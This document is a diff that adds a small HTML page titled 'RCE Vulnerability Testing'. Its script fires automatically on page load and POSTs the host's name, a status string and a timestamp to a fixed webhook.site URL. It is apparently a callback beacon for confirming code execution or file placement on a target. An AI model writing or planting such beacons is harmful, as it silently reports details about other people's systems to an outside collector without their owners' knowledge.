@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RCE Vulnerability Testing</title>
+    <script>
+        function testRCE() {
+            var hostname = window.location.hostname;
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                target: hostname,
+                status: 'vulnerability check initiated',
+                timestamp: new Date().toISOString()
+            }));
+        }
+    </script>
+</head>
+<body onload="testRCE()">
+    <h1>RCE Vulnerability Testing</h1>
+    <p>Testing for RCE vulnerability at <span id="hostname"></span></p>
+    <script>
+        document.getElementById('hostname').innerText = window.location.hostname;
+    </script>
+</body>
+</html>
